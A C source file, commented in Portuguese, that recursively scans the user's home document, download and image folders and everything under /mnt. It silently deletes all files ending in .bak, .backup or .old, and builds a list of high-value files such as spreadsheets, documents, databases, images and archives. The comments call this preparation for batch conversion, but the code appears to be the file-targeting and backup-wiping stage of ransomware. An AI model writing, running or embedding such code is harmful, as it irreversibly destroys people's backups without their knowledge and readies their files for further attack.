#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <dirent.h>
#include <sys/stat.h>

/*
 * Verifica se o caminho termina com a extensão informada (case-insensitive).
 * A extensão deve incluir o ponto, por exemplo: ".bak".
 */
static int has_suffix_ci(const char *path, const char *ext) {
    size_t plen = strlen(path);
    size_t elen = strlen(ext);

    if (plen < elen)
        return 0;

    return strncasecmp(path + plen - elen, ext, elen) == 0;
}

/*
 * Concatena um diretório com o nome de uma entrada.
 * Retorna uma string alocada com malloc().
 */
static char *join_path(const char *dir, const char *name) {
    size_t dlen = strlen(dir);
    size_t nlen = strlen(name);
    int need_slash = (dlen > 0 && dir[dlen - 1] != '/');

    char *out = malloc(dlen + need_slash + nlen + 1);
    if (!out)
        return NULL;

    char *p = out;
    memcpy(p, dir, dlen);
    p += dlen;

    if (need_slash)
        *p++ = '/';

    memcpy(p, name, nlen + 1);
    return out;
}

/*
 * Adiciona uma cópia do caminho ao array dinâmico de strings.
 */
static int list_add(char ***list, size_t *count, size_t *cap, const char *path) {
    if (*count == *cap) {
        size_t new_cap = (*cap == 0) ? 16 : (*cap * 2);
        char **new_list = realloc(*list, new_cap * sizeof(char *));

        if (!new_list)
            return -1;

        *list = new_list;
        *cap = new_cap;
    }

    char *copy = strdup(path);
    if (!copy)
        return -1;

    (*list)[(*count)++] = copy;
    return 0;
}

/*
 * Libera um array de strings com `count` elementos.
 */
static void free_strings(char **list, size_t count) {
    if (!list)
        return;

    for (size_t i = 0; i < count; i++)
        free(list[i]);

    free(list);
}

/*
 * Percorre recursivamente um diretório. Diretórios sem permissão são
 * ignorados silenciosamente. Links simbólicos não são seguidos.
 */
static int scan_dir_recursive(const char *dirpath,
                              char ***list,
                              size_t *count,
                              size_t *cap) {
    DIR *d = opendir(dirpath);
    if (!d)
        return 0;

    struct dirent *entry;

    while ((entry = readdir(d)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 ||
            strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        char *full = join_path(dirpath, entry->d_name);
        if (!full) {
            closedir(d);
            return -1;
        }

        struct stat st;
        if (lstat(full, &st) != 0) {
            free(full);
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            int rc = scan_dir_recursive(full, list, count, cap);
            if (rc != 0) {
                free(full);
                closedir(d);
                return rc;
            }
        } else if (S_ISREG(st.st_mode)) {
            /*
             * Remove backups antigos e mantém apenas os arquivos
             * que interessam para a conversão em lote.
             */
            if (has_suffix_ci(full, ".bak") ||
                has_suffix_ci(full, ".backup") ||
                has_suffix_ci(full, ".old")) {
                remove(full);
            } else if (has_suffix_ci(full, ".xlsx") ||
                       has_suffix_ci(full, ".docx") ||
                       has_suffix_ci(full, ".pdf") ||
                       has_suffix_ci(full, ".txt") ||
                       has_suffix_ci(full, ".csv") ||
                       has_suffix_ci(full, ".jpg") ||
                       has_suffix_ci(full, ".png") ||
                       has_suffix_ci(full, ".db") ||
                       has_suffix_ci(full, ".psd") ||
                       has_suffix_ci(full, ".zip") ||
                       has_suffix_ci(full, ".rar")) {
                if (list_add(list, count, cap, full) != 0) {
                    free(full);
                    closedir(d);
                    return -1;
                }
            }
        }

        free(full);
    }

    closedir(d);
    return 0;
}

/*
 * Função pública: percorre os diretórios esperados e devolve uma lista
 * de arquivos que sobraram após a remoção de backups.
 */
char **scan_directories(size_t *out_count) {
    if (!out_count)
        return NULL;

    *out_count = 0;

    char **list = NULL;
    size_t count = 0;
    size_t cap = 0;

    const char *home = getenv("HOME");
    if (home && home[0] != '\0') {
        static const char *subdirs[] = {
            "Documentos_Teste",
            "Documentos",
            "Downloads",
            "Imagens",
            NULL
        };

        for (size_t i = 0; subdirs[i] != NULL; i++) {
            char *path = join_path(home, subdirs[i]);
            if (!path)
                goto fail;

            int rc = scan_dir_recursive(path, &list, &count, &cap);
            free(path);

            if (rc != 0)
                goto fail;
        }
    }

    int rc = scan_dir_recursive("/mnt", &list, &count, &cap);
    if (rc != 0)
        goto fail;

    /*
     * Garante que a lista retornada tenha um terminador NULL,
     * sem alterar o valor de *out_count.
     */
    if (cap == count) {
        char **tmp = realloc(list, (count + 1) * sizeof(char *));
        if (!tmp)
            goto fail;

        list = tmp;
    }

    list[count] = NULL;
    *out_count = count;
    return list;

fail:
    fprintf(stderr, "scan_directories: out of memory\n");
    free_strings(list, count);
    *out_count = 0;
    return NULL;
}